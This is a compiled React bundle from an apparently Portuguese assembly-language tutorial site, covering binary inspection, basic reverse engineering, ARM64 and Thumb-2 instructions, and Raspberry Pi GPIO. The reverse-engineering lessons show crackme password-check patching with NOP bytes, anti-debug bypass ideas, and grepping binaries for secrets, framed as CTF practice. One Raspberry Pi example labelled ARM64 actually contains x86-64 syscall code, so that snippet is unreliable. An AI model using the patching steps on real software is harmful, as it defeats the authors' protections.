strings $PROG | grep -iE "(password|key|secret|flag|token|admin|root|exec|system|http)" | head -20

echo -e "
=== IMPORTS ==="
nm -D $PROG 2>/dev/null | grep -E "^[[:space:]]+U " | awk '{print $3}' | head -30

echo -e "
=== PONTOS DE ENTRADA ==="
readelf -s $PROG 2>/dev/null | grep -E "(main|_start|init|fini)"

echo -e "
=== SYSCALLS (via strace) ==="
strace -c ./$PROG 2>&1 | tail -20`}),r.jsx("h2",{children:"Checksec — Verificar Proteções"}),r.jsx(d,{language:"bash",code:`# checksec verifica proteções de segurança do binário:
checksec --file=./programa

# Saída típica:
# RELRO           STACK CANARY      NX            PIE
# Full RELRO      Canary found      NX enabled    PIE enabled

# Proteções:
# RELRO:     Relocation Read-Only (GOT somente leitura após relocação)
# Canary:    Stack canary (proteção contra stack overflow)
# NX:        No-Execute (stack/heap não executável)
# PIE:       Position Independent Executable (ASLR completo)
# FORTIFY:   Funções da libc com proteção extra`}),r.jsx("h2",{children:"Análise Dinâmica vs Estática"}),r.jsx(d,{language:"bash",code:`# ESTÁTICA — analisa sem executar (seguro):
# - objdump, readelf, nm, strings
# - radare2, ghidra, IDA Pro
# - Bom para: entender estrutura, encontrar funções

# DINÂMICA — executa e observa:
# - GDB, strace, ltrace
# - Intel PIN (instrumentação binária)
# - Bom para: ver comportamento real, argumentos de syscall

# Ambiente SEGURO para malware:
# - VM (VirtualBox/KVM) isolada
# - Sem rede (ou rede monitorada)
# - Snapshot antes de executar
# - Ferramentas: Cuckoo Sandbox, Any.run`})]})}function S1(){return r.jsxs(L,{title:"Engenharia Reversa Básica",subtitle:"Reconstituindo lógica de alto nível a partir de Assembly",difficulty:"avancado",timeToRead:"20 min",children:[r.jsx("p",{children:"Engenharia reversa (RE) é a arte de entender o comportamento de um programa a partir de seu código de máquina. É usada em análise de malware, pentesting e pesquisa de segurança."}),r.jsx("h2",{children:"Reconhecendo Padrões Comuns"}),r.jsx("h3",{children:"if/else em Assembly"}),r.jsx(d,{language:"nasm",filename:"re_patterns.asm",code:`; Padrão de if/else (reconhecer no Ghidra/radare2):
cmp rax, 5       ; comparação
jl  .caso_menor  ; salto condicional
; bloco else: rax >= 5
jmp .fim
.caso_menor:
; bloco if: rax < 5
.fim:

; Tradução C:
; if (rax < 5) { /* caso_menor */ }
; else { /* caso else */ }

; Loop while:
.loop_head:
    cmp rcx, 0
    je  .loop_end
    ; corpo do loop
    dec rcx
    jmp .loop_head
.loop_end:
; C: while (rcx != 0) { ...; rcx--; }

; Acesso a struct (offset fixo):
mov rax, [rbx + 8]   ; rbx = ponteiro, 8 = offset de campo
; C: int val = ptr->campo2; (campo2 está no offset 8)`}),r.jsx("h2",{children:"Reconhecendo Chamadas de Sistema"}),r.jsx(d,{language:"nasm",filename:"re_syscalls.asm",code:`; Padrões de syscall comuns (Linux x86-64):

; read() — lendo entrada do usuário:
mov rax, 0          ; sys_read
mov rdi, 0          ; stdin
; ...
syscall

; write() — printando algo:
mov rax, 1          ; sys_write
mov rdi, 1          ; stdout
; ...
syscall

; execve() — executando outro programa (raro em código normal!):
mov rax, 59         ; sys_execve — SUSPEITO em malware!
; ...
syscall

; mmap() — alocando memória executável (suspeito!):
mov rax, 9          ; sys_mmap
; ...
mov rdx, 7          ; PROT_READ|PROT_WRITE|PROT_EXEC — MUITO SUSPEITO!
syscall`}),r.jsx("h2",{children:"Entendendo Verificações de Senha"}),r.jsx(d,{language:"bash",code:`; Padrão clássico de verificação de senha (crackme):

; 1. strcmp simples (fácil de quebrar):
; As strings ficam no .rodata e podem ser vistas com 'strings'
cmp byte [password], 'A'   ; comparar caractere por caractere
jne .wrong
cmp byte [password + 1], 'd'
jne .wrong

; 2. Hash da senha (mais difícil):
call calcular_hash(password)  → rax
cmp rax, 0xDEADBEEF          ; compara com hash esperado
jne .wrong

; Como quebrar: procurar a comparação e ver o valor esperado (0xDEADBEEF)

; 3. XOR encryption (clássico em CTF):
; Comparar cada byte XOR'd com uma chave fixa
; Procurar: a XOR b JE/JNE — a chave está ali!`}),r.jsx("h2",{children:"Crackme — Exercício Prático"}),r.jsx(T,{type:"info",title:"CTF e Crackmes",children:"Crackmes são programas propositalmente difíceis de entender, usados para praticar reversão. Sites como crackmes.one oferecem centenas de desafios. CTF (Capture The Flag) competições têm challenges de RE."}),r.jsx(d,{language:"bash",code:`# Workflow típico de crackme:

# 1. Informações básicas:
file crackme
checksec --file=crackme
strings crackme | grep -v "^.$" | head -30

# 2. Análise estática:
r2 -A crackme
# No r2:
afl         # listar funções
pdf @main   # ver main
pdf @sym.check_password  # ver função de verificação

# 3. Encontrar string de sucesso:
strings crackme | grep -iE "(correct|valid|congrat|win|flag)"

# 4. Cross-reference (quem usa essa string):
# No radare2: axt @str.correct_password

# 5. Analisar a lógica de verificação

# 6. Patch binário (modificar para aceitar qualquer senha):
# No GDB: set {char}0x401234 = 0x90  (NOP um JE crucial)
# No r2: wx 90 @0x401234`}),r.jsx("h2",{children:"Anti-Debug Techniques"}),r.jsx(d,{language:"nasm",filename:"antidebug.asm",code:`; Programas protegidos usam técnicas anti-debug:

; 1. ptrace check — detecta GDB:
; GDB usa ptrace(PTRACE_TRACEME) internamente
mov rax, 101        ; sys_ptrace
mov rdi, 0          ; PTRACE_TRACEME
xor rsi, rsi
xor rdx, rdx
syscall
; Se rax < 0, estamos sendo debugados!

; 2. Timing check — GDB é muito mais lento:
rdtsc               ; lê timestamp
; ... executar código ...
rdtsc
; Se diferença > threshold, provavelmente em debug

; 3. INT3 + SIGTRAP:
; Em GDB, int3 causa SIGTRAP. Fora do GDB, o programa pode
; registrar um handler para SIGTRAP e continuar normalmente.
int3                ; breakpoint instruction

; Como bypassar: patch o binário ou use GDB com script para ignorar`})]})}function A1(){return r.jsxs(L,{title:"Introdução ao ARM",subtitle:"A arquitetura dominante em dispositivos móveis e embarcados",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsx("p",{children:"ARM é a arquitetura de processadores mais popular do mundo — está em todos os smartphones, tablets, Raspberry Pi, e agora em servidores (AWS Graviton) e desktops (Apple M1/M2). É uma arquitetura RISC, bem diferente do x86-64."}),r.jsx("h2",{children:"ARM vs x86-64"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"x86-64"}),r.jsx("th",{children:"ARM (AArch64)"})]})}),r.jsx("tbody",{children:[["Tipo","CISC","RISC"],["Registradores gerais","16 (RAX-R15)","31 (X0-X30) + XZR"],["Tamanho das instruções","Variável (1-15 bytes)","Fixo (4 bytes em A64)"],["Modos","16/32/64-bit","32-bit (T32/A32) + 64-bit (A64)"],["Acesso à memória","Direto em qualquer instrução","LOAD/STORE exclusivo"],["Flags","RFLAGS","NZCV (N,Z,C,V)"],["Fabricantes","Intel, AMD","Qualcomm, Apple, Cortex-A..."],["Licença","Próprio","Licenciado pela ARM Ltd."]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Princípios RISC do ARM"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Load/Store:"})," Apenas LOAD e STORE acessam memória. Todas as operações são entre registradores."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Instruções fixas:"})," Toda instrução tem exatamente 4 bytes (em A64), facilitando fetch e decode."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Muitos registradores:"})," 31 registradores gerais reduzem acesso à memória."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Operações de 3 operandos:"})," ADD X0, X1, X2 (dest, src1, src2) — sem destrutividade."]})]}),r.jsx("h2",{children:"Modos de Execução ARM"}),r.jsx(d,{language:"bash",code:`# ARM tem múltiplos estados de execução:
# A64 (AArch64): 64-bit, instruções de 4 bytes
# A32 (AArch32): 32-bit ARM clássico, instruções de 4 bytes
# T32 (Thumb-2): modo compacto de 32-bit, instruções de 2 ou 4 bytes
# T16 (Thumb): modo mais compacto, instruções de 2 bytes (ARM Cortex-M)

# No Linux, um processo é 32-bit ou 64-bit — não pode misturar no mesmo thread
# (exceto com chamadas especiais)

# Verificar em qual modo o código roda:
uname -m    # aarch64 = 64-bit, armv7l = 32-bit`}),r.jsx("h2",{children:"Hello World em ARM64 (AArch64)"}),r.jsx(d,{language:"nasm",filename:"hello_arm.s",code:`// hello_arm.s — AArch64 (ARM64) Linux
// Compilar: as -o hello.o hello_arm.s && ld -o hello hello.o
// Ou: gcc -nostdlib hello_arm.s -o hello

.section .data
msg:    .ascii "Hello, ARM64!\\n"
msg_len = . - msg

.section .text
.global _start

_start:
    // write(1, msg, msg_len)
    mov x8, #64         // syscall: sys_write (número DIFERENTE do x86!)
    mov x0, #1          // fd = stdout
    ldr x1, =msg        // x1 = endereço da mensagem
    mov x2, #msg_len    // x2 = tamanho
    svc #0              // system call (não 'syscall'!)

    // exit(0)
    mov x8, #93         // syscall: sys_exit
    mov x0, #0          // exit code = 0
    svc #0`}),r.jsxs(T,{type:"info",title:"SVC vs SYSCALL",children:["Em ARM64, a instrução para fazer system call é ",r.jsx("code",{children:"SVC #0"})," (Supervisor Call), não ",r.jsx("code",{children:"syscall"}),". Os números de syscall também são diferentes! No AArch64 Linux: write=64, exit=93, read=63."]}),r.jsx("h2",{children:"Toolchain ARM no Linux"}),r.jsx(d,{language:"bash",code:`# Instalar toolchain ARM64 cross-compiler (para compilar no x86):
sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu
sudo apt install qemu-user    # para executar binários ARM no x86

# Compilar:
aarch64-linux-gnu-gcc -o programa programa.c
aarch64-linux-gnu-as -o programa.o programa.s
aarch64-linux-gnu-ld -o programa programa.o

# Executar no x86 via QEMU:
qemu-aarch64 ./programa
qemu-aarch64 -L /usr/aarch64-linux-gnu ./programa  # com shared libs

# No Raspberry Pi ou outro hardware ARM, compile diretamente:
gcc -o programa programa.c   # sem cross-compiler`})]})}function R1(){return r.jsxs(L,{title:"Registradores ARM64",subtitle:"Os 31 registradores gerais, registradores de sistema e flags do AArch64",difficulty:"intermediario",timeToRead:"12 min",children:[r.jsx("p",{children:"ARM64 (AArch64) tem 31 registradores gerais de propósito geral (X0-X30) mais o registrador zero (XZR). Cada registrador de 64-bit (Xn) também tem um acesso de 32-bit (Wn)."}),r.jsx("h2",{children:"Registradores Gerais"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"64-bit"}),r.jsx("th",{children:"32-bit"}),r.jsx("th",{children:"Uso na ABI"})]})}),r.jsx("tbody",{children:[["X0-X7","W0-W7","Argumentos 1-8 e valores de retorno"],["X8","W8","Indirect result (ponteiro de retorno de struct)"],["X9-X15","W9-W15","Caller-saved (temporários)"],["X16-X17","W16-W17","IP0, IP1 (Intra-procedure calls)"],["X18","W18","Platform register (reservado em alguns OS)"],["X19-X28","W19-W28","Callee-saved"],["X29","W29","Frame Pointer (FP)"],["X30","W30","Link Register (LR — endereço de retorno)"],["XZR/WZR","-","Zero register (leitura = 0, escrita = descartado)"],["SP","-","Stack Pointer (64-bit, sem W)"],["PC","-","Program Counter (não lido/escrito diretamente)"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Registrador Zero (XZR/WZR)"}),r.jsx(d,{language:"bash",filename:"xzr.s",code:`// XZR é sempre zero — leitura retorna 0, escritas são descartadas
MOV X0, XZR      // X0 = 0 (mais eficiente que MOV X0, #0)
ADD X0, X1, XZR  // X0 = X1 + 0 = X1

// CMP usa XZR internamente:
CMP X0, #0       // equivalente a SUBS XZR, X0, #0
// seta flags N, Z, C, V`}),r.jsx("h2",{children:"Flags NZCV do ARM64"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Flag"}),r.jsx("th",{children:"Significado"}),r.jsx("th",{children:"Setado quando"})]})}),r.jsx("tbody",{children:[["N","Negative","resultado é negativo (MSB=1)"],["Z","Zero","resultado é zero"],["C","Carry","houve carry (overflow unsigned)"],["V","oVerflow","houve overflow (signed)"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("strong",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Registradores de Sistema"}),r.jsx(d,{language:"bash",code:`// Registradores de sistema acessados com MRS/MSR:
// (não são registradores gerais — acesso especial)

MRS X0, NZCV         // ler flags
MSR NZCV, X0         // escrever flags

MRS X0, CurrentEL    // ler nível de exceção atual (EL0=user, EL1=kernel)
MRS X0, DAIF         // ler interrupt mask flags
MRS X0, SPSel        // ler qual SP está ativo

// CNTVCT_EL0 — contador de tempo (equivalente ao TSC do x86):
MRS X0, CNTVCT_EL0   // ler contador
MRS X1, CNTFRQ_EL0   // frequência do contador (Hz)`}),r.jsx("h2",{children:"SIMD em ARM: Registradores NEON/SVE"}),r.jsx(d,{language:"bash",code:`// ARM tem também registradores SIMD:
// V0-V31: registradores de 128 bits (NEON/Advanced SIMD)
//   B0-B31: 8-bit (byte)
//   H0-H31: 16-bit (half)
//   S0-S31: 32-bit (single float)
//   D0-D31: 64-bit (double)
//   Q0-Q31: 128-bit (quad)

// Exemplo NEON:
LD1 {V0.4S}, [X0]     // carrega 4 floats de X0
LD1 {V1.4S}, [X1]     // carrega 4 floats de X1
FADD V2.4S, V0.4S, V1.4S  // soma 4 floats
ST1 {V2.4S}, [X2]     // salva resultado

// SVE (Scalable Vector Extension) — vetores de tamanho variável:
// Disponível em ARM Cortex-X2, Neoverse, Amazon Graviton 3
// Tamanho de vetor pode ser 128, 256, 512, ... até 2048 bits!`})]})}function E1(){return r.jsxs(L,{title:"Instruções ARM64",subtitle:"O conjunto completo de instruções AArch64",difficulty:"intermediario",timeToRead:"20 min",children:[r.jsx("p",{children:"ARM64 (AArch64) tem um conjunto de instruções limpo e regular. A principal diferença do x86-64 é a arquitetura LOAD/STORE: apenas LDR e STR acessam memória."}),r.jsx("h2",{children:"LOAD/STORE — Acesso à Memória"}),r.jsx(d,{language:"bash",filename:"ldr_str.s",code:`// LDR — Load Register
LDR X0, [X1]          // X0 = *X1 (64-bit)
LDR W0, [X1]          // W0 = *(int*)X1 (32-bit, zero-extend)
LDRB W0, [X1]         // W0 = *(byte*)X1 (8-bit, zero-extend)
LDRH W0, [X1]         // W0 = *(short*)X1 (16-bit, zero-extend)
LDRSB X0, [X1]        // X0 = *(signed byte*)X1 (sign-extend)
LDRSH X0, [X1]        // X0 = *(signed short*)X1
LDRSW X0, [X1]        // X0 = *(signed int*)X1

// Modos de endereçamento:
LDR X0, [X1, #8]      // X0 = *(X1 + 8)  — offset imediato
LDR X0, [X1, X2]      // X0 = *(X1 + X2) — registro offset
LDR X0, [X1, X2, LSL #3]  // X0 = *(X1 + X2*8) — scaled offset

// Pre-indexado (atualiza X1 antes de ler):
LDR X0, [X1, #8]!     // X1 += 8; X0 = *X1

// Post-indexado (atualiza X1 depois de ler):
LDR X0, [X1], #8      // X0 = *X1; X1 += 8

// STR — Store Register
STR X0, [X1]          // *X1 = X0
STR W0, [X1, #8]      // *(X1+8) = W0 (32-bit)
STRB W0, [X1]         // *(byte*)X1 = W0

// Pair load/store (dois registradores de uma vez):
LDP X0, X1, [SP, #16]  // X0 = *(SP+16), X1 = *(SP+24)
STP X0, X1, [SP, #-16]! // SP -= 16; *(SP) = X0, *(SP+8) = X1`}),r.jsx("h2",{children:"Operações Aritméticas"}),r.jsx(d,{language:"bash",filename:"arith.s",code:`// Forma geral: OP Rd, Rn, Rm (ou imediato)
ADD X0, X1, X2         // X0 = X1 + X2
ADD X0, X1, #10        // X0 = X1 + 10
ADDS X0, X1, X2        // X0 = X1 + X2, seta flags (S = set flags)
SUB X0, X1, X2         // X0 = X1 - X2
SUBS X0, X1, X2        // seta flags
MUL X0, X1, X2         // X0 = X1 * X2 (low 64-bit)
UMULH X0, X1, X2       // X0 = (X1 * X2) >> 64 (high 64-bit, unsigned)
SMULH X0, X1, X2       // high 64-bit, signed
UDIV X0, X1, X2        // X0 = X1 / X2 (unsigned)
SDIV X0, X1, X2        // X0 = X1 / X2 (signed)
MSUB X0, X1, X2, X3   // X0 = X3 - X1 * X2 (multiply-subtract)
MADD X0, X1, X2, X3   // X0 = X3 + X1 * X2 (multiply-add)
// Módulo via: a - (a/b)*b:
UDIV X3, X0, X1        // X3 = a/b
MSUB X0, X3, X1, X0   // X0 = a - (a/b)*b = a % b`}),r.jsx("h2",{children:"Shift e Bitwise"}),r.jsx(d,{language:"bash",filename:"shifts.s",code:`// Shifts como modificadores de instrução:
LSL X0, X1, #3         // X0 = X1 << 3 (× 8)
LSR X0, X1, #3         // X0 = X1 >> 3 (unsigned)
ASR X0, X1, #3         // X0 = X1 >> 3 (signed, mantém sinal)
ROR X0, X1, #3         // X0 = rotate_right(X1, 3)

// Bitwise:
AND X0, X1, X2         // X0 = X1 & X2
ORR X0, X1, X2         // X0 = X1 | X2
EOR X0, X1, X2         // X0 = X1 ^ X2 (Exclusive OR)
BIC X0, X1, X2         // X0 = X1 & ~X2 (Bit Clear)
MVN X0, X1             // X0 = ~X1 (bitwise NOT)

// MOV e MOVZ/MOVN/MOVK:
MOV X0, X1             // X0 = X1
MOV X0, #42            // X0 = 42 (imediato pequeno)
MOVZ X0, #0x1234       // X0 = 0x0000000000001234 (zero outros)
MOVZ X0, #0x1234, LSL #16  // X0 = 0x0000000012340000
MOVK X0, #0x5678, LSL #32  // mantém outros bits, seta bits 32-47

// ADR — load address:
ADR X0, label          // X0 = endereço de 'label' (PC-relativo ±1MB)
ADRP X0, label         // X0 = página de 'label' (±4GB)
ADD X0, X0, :lo12:label // X0 = endereço completo de 'label'`}),r.jsx("h2",{children:"Saltos e Chamadas"}),r.jsx(d,{language:"bash",filename:"branch.s",code:`// Salto incondicional:
B label               // pula para label (não salva endereço de retorno)
BR X0                 // pula para endereço em X0

// Chamada de função (salva PC+4 em LR = X30):
BL label              // call label (branch and link)
BLR X0               // call via registrador

// Retorno:
RET                   // pula para X30 (LR)
RET X1               // pula para X1 (raramente usado)

// Saltos condicionais:
CMP X0, X1           // SUBS XZR, X0, X1
B.EQ label           // pula se igual (Z=1)
B.NE label           // pula se diferente
B.LT label           // pula se menor (signed)
B.GT label           // pula se maior (signed)
B.LE label           // menor ou igual
B.GE label           // maior ou igual
B.LO label           // menor (unsigned, =B.CC)
B.HI label           // maior (unsigned)
B.PL label           // positivo (N=0)
B.MI label           // negativo (N=1)

// Teste de bit:
TBZ X0, #5, label    // pula se bit 5 de X0 = 0
TBNZ X0, #5, label   // pula se bit 5 de X0 = 1
CBZ X0, label        // pula se X0 == 0
CBNZ X0, label       // pula se X0 != 0`}),r.jsx(T,{type:"info",title:"Função Simples em ARM64",children:"Diferente do x86-64, ARM64 não usa PUSH/POP para salvar o endereço de retorno. Em vez disso, BL salva o endereço de retorno em X30 (LR), e RET lê de X30. Se a função chama outra, precisa salvar X30 na stack manualmente com STP."}),r.jsx("h2",{children:"Funções em ARM64"}),r.jsx(d,{language:"bash",filename:"funcao_arm.s",code:`.section .text
.global soma
.global fatorial

// long soma(long a, long b) — a=X0, b=X1, retorno=X0
soma:
    ADD X0, X0, X1          // X0 = a + b
    RET                     // retorna X0

// long fatorial(long n)
fatorial:
    // Prólogo — salvar LR e registradores callee-saved
    STP X29, X30, [SP, #-16]!   // salvar FP e LR, SP -= 16
    MOV X29, SP                  // FP = SP

    // Base case: if (n <= 1) return 1
    CMP X0, #1
    B.GT .recursivo
    MOV X0, #1
    LDP X29, X30, [SP], #16     // restaurar, SP += 16
    RET

.recursivo:
    // Salvar n (X0)
    STP X19, XZR, [SP, #-16]!  // salvar X19 (callee-saved)
    MOV X19, X0                 // X19 = n

    // fatorial(n-1)
    SUB X0, X0, #1
    BL fatorial                  // X0 = fatorial(n-1)

    // resultado = n * fatorial(n-1)
    MUL X0, X19, X0            // X0 = n * fatorial(n-1)

    // Epílogo
    LDP X19, XZR, [SP], #16
    LDP X29, X30, [SP], #16
    RET`})]})}function C1(){return r.jsxs(L,{title:"Thumb e ARM Thumb-2",subtitle:"Instruções compactas de 16-bit para código mais denso",difficulty:"avancado",timeToRead:"12 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"Thumb"})," é um subconjunto de instruções ARM de 16 bits (vs 32 bits do ARM clássico). ",r.jsx("strong",{children:"Thumb-2"})," é uma extensão que mistura instruções de 16 e 32 bits. Muito usado em microcontroladores (STM32, Arduino) e kernels embarcados."]}),r.jsx("h2",{children:"Por que Thumb?"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Menor tamanho de código (~30% menor que ARM de 32-bit)"}),r.jsx("li",{children:"Melhor densidade de código = mais instruções na cache = mais rápido em sistemas com cache pequena"}),r.jsx("li",{children:"Arm Cortex-M (microcontroladores) só roda Thumb-2 — sem modo ARM clássico"}),r.jsx("li",{children:"iOS e Android usam Thumb-2 extensivamente"})]}),r.jsx("h2",{children:"Diferenças Thumb vs ARM (32-bit)"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"ARM (A32)"}),r.jsx("th",{children:"Thumb (T16)"})]})}),r.jsx("tbody",{children:[["Tamanho instrução","4 bytes","2 bytes"],["Registradores disponíveis","R0-R15","R0-R7 (maioria)"],["Execução condicional","Qualquer instrução","Apenas branches"],["Barrel shifter","Em qualquer instrução","Operação separada"],["MUL","R0 = Rm × Rs","MULS R0, R1 (result em R0)"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Hello World em Thumb-2 (Linux ARM 32-bit)"}),r.jsx(d,{language:"bash",filename:"hello_thumb.s",code:`// hello_thumb.s — ARM 32-bit com Thumb-2
// Compilar: arm-linux-gnueabihf-as -mthumb -o hello.o hello_thumb.s
//           arm-linux-gnueabihf-ld -o hello hello.o

.syntax unified
.thumb                      // mudar para modo Thumb

.section .data
msg:    .ascii "Hello, Thumb!\\n"
msg_len = . - msg

.section .text
.global _start
.thumb_func                 // próxima função é Thumb

_start:
    // write(1, msg, msg_len)
    mov r7, #4              // syscall: sys_write (Linux ARM 32-bit)
    mov r0, #1              // fd = stdout
    ldr r1, =msg            // r1 = &msg
    mov r2, #msg_len        // r2 = tamanho
    svc #0                  // system call

    // exit(0)
    mov r7, #1              // syscall: sys_exit
    mov r0, #0
    svc #0`}),r.jsx("h2",{children:"ARM Cortex-M — Thumb-2 Only"}),r.jsx(T,{type:"info",title:"Microcontroladores",children:"Os populares STM32, Arduino (ATmega usa AVR, mas STM32 usa Thumb-2), e ESP32 (Xtensa, mas similar) são programados em Thumb-2. Se você desenvolve firmware embedded, é Thumb-2 que você usa."}),r.jsx(d,{language:"bash",filename:"cortex_m.s",code:`// Exemplo STM32 — Piscar LED (Cortex-M4)
// Registradores de hardware do STM32F4:
.equ RCC_BASE,     0x40023800
.equ RCC_AHB1ENR,  0x30        // offset do clock enable register
.equ GPIOA_BASE,   0x40020000
.equ GPIOx_MODER,  0x00        // mode register
.equ GPIOx_ODR,    0x14        // output data register

.text
.thumb
.thumb_func
.global Reset_Handler

Reset_Handler:
    // 1. Habilitar clock do GPIOA:
    LDR R0, =RCC_BASE + RCC_AHB1ENR
    LDR R1, [R0]
    ORR R1, R1, #(1 << 0)      // bit 0 = GPIOA enable
    STR R1, [R0]

    // 2. Configurar PA5 como saída (LED):
    LDR R0, =GPIOA_BASE + GPIOx_MODER
    LDR R1, [R0]
    AND R1, R1, #~(3 << 10)    // limpar bits de modo PA5
    ORR R1, R1, #(1 << 10)     // setar como saída (01)
    STR R1, [R0]

    // 3. Loop infinito piscando:
loop:
    LDR R0, =GPIOA_BASE + GPIOx_ODR
    LDR R1, [R0]
    EOR R1, R1, #(1 << 5)      // toggle bit 5 (PA5)
    STR R1, [R0]

    LDR R1, =1000000            // delay simples
delay:
    SUBS R1, R1, #1
    BNE delay

    B loop`}),r.jsx("h2",{children:"BKPT — Breakpoint em ARM"}),r.jsx(d,{language:"bash",code:`// Em ARM, breakpoints usam BKPT (não INT 3 como no x86):
BKPT #0         // software breakpoint
// O número (#0) é convenção — GDB usa BKPT #1 para seus breakpoints`})]})}function _1(){return r.jsxs(L,{title:"Assembly no Raspberry Pi",subtitle:"Programação bare-metal e GPIO com ARM Assembly",difficulty:"avancado",timeToRead:"15 min",children:[r.jsx("p",{children:"O Raspberry Pi usa processadores ARM Cortex-A e é uma plataforma perfeita para aprender Assembly ARM em hardware real. Você pode programar bare-metal (sem OS) ou escrever programas Assembly no Linux ARM64."}),r.jsx(T,{type:"info",title:"Modelos do Raspberry Pi",children:"Pi 1/2/3 = ARM 32-bit (Cortex-A7/A53). Pi 4/5 = ARM 64-bit (Cortex-A72/A76). Use AArch64 no Pi 4/5 para programação moderna."}),r.jsx("h2",{children:"Configuração Inicial"}),r.jsx(d,{language:"bash",code:`# No Raspberry Pi OS (64-bit):
# Instalar ferramentas de desenvolvimento:
sudo apt update
sudo apt install build-essential gcc gdb

# Compilar Assembly ARM64:
as hello.s -o hello.o
ld hello.o -o hello
./hello

# Para cross-compilar do PC (x86):
sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu qemu-user
aarch64-linux-gnu-as hello.s -o hello.o
aarch64-linux-gnu-ld hello.o -o hello
qemu-aarch64 ./hello`}),r.jsx("h2",{children:"GPIO — Piscar LED (Bare Metal)"}),r.jsx("p",{children:"No Raspberry Pi, você pode controlar o GPIO acessando registradores de hardware diretamente em Assembly:"}),r.jsx(d,{language:"bash",filename:"gpio_blink.s",code:`// GPIO Blink no Raspberry Pi 4 (AArch64 Bare Metal)
// O GPIO do Pi 4 está mapeado em 0xFE200000

.equ GPIO_BASE,    0xFE200000
.equ GPFSEL1,      0x04    // GPIO Function Select 1 (pinos 10-19)
.equ GPSET0,       0x1C    // GPIO Pin Output Set 0
.equ GPCLR0,       0x28    // GPIO Pin Output Clear 0

// Pino GPIO 18 (bit 18 em GPSET0/GPCLR0)
// GPFSEL1 bits 24-26 controlam o modo do GPIO 18

.text
.global _start

_start:
    LDR X0, =GPIO_BASE

    // Configurar GPIO 18 como saída (FSEL18 = 001):
    LDR W1, [X0, #GPFSEL1]
    AND W1, W1, #~(7 << 24)     // limpar bits 24-26
    ORR W1, W1, #(1 << 24)      // setar como output (001)
    STR W1, [X0, #GPFSEL1]

blink_loop:
    // Acender LED (setar GPIO 18):
    MOV W1, #(1 << 18)
    STR W1, [X0, #GPSET0]

    // Delay:
    LDR X2, =2000000
delay1:
    SUBS X2, X2, #1
    B.NE delay1

    // Apagar LED (limpar GPIO 18):
    MOV W1, #(1 << 18)
    STR W1, [X0, #GPCLR0]

    LDR X2, =2000000
delay2:
    SUBS X2, X2, #1
    B.NE delay2

    B blink_loop`}),r.jsx("h2",{children:"GPIO via /dev/mem (Linux)"}),r.jsx(d,{language:"bash",filename:"gpio_mem.s",code:`// Via Linux — mmap do /dev/mem para acesso ao GPIO
// Mais seguro que bare metal para desenvolvimento

// Em C (mais fácil para o mmap):
// void *gpio = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
//                  MAP_SHARED, fd, GPIO_BASE);
// Depois usa o ponteiro 'gpio' para acessar os registradores

// Em Assembly, você chamaria sys_mmap (9) e sys_open (2):
section .data
    devmem db "/dev/mem", 0

section .text
    ; sys_open("/dev/mem", O_RDWR|O_SYNC, 0)
    mov rax, 2
    lea rdi, [devmem]
    mov rsi, 0x1002     ; O_RDWR | O_SYNC
    xor rdx, rdx
    syscall
    mov rbx, rax        ; fd

    ; sys_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPIO_BASE)
    mov rax, 9
    xor rdi, rdi
    mov rsi, 4096
    mov rdx, 3          ; PROT_READ | PROT_WRITE
    mov r10, 1          ; MAP_SHARED
    mov r8, rbx         ; fd
    mov r9, 0xFE200000  ; offset = GPIO_BASE
    syscall
    ; rax = ponteiro para GPIO mapeado`}),r.jsx("h2",{children:"Usando UART para Debug"}),r.jsx(d,{language:"bash",filename:"uart.s",code:`// Em sistemas bare metal, use UART para debug em vez de tela
// Pi 4 UART0 (PL011): 0xFE201000

.equ UART0_BASE, 0xFE201000
.equ UART0_DR,   0x00    // Data Register
.equ UART0_FR,   0x18    // Flag Register
.equ UART_FR_TXFF, (1 << 5)  // TX FIFO Full

// Enviar um char via UART:
uart_putchar:
    LDR X1, =UART0_BASE
.wait:
    LDR W2, [X1, #UART0_FR]     // ler flags
    TST W2, #UART_FR_TXFF       // TX FIFO cheia?
    B.NE .wait                   // espera se cheia
    STR W0, [X1, #UART0_DR]     // enviar byte
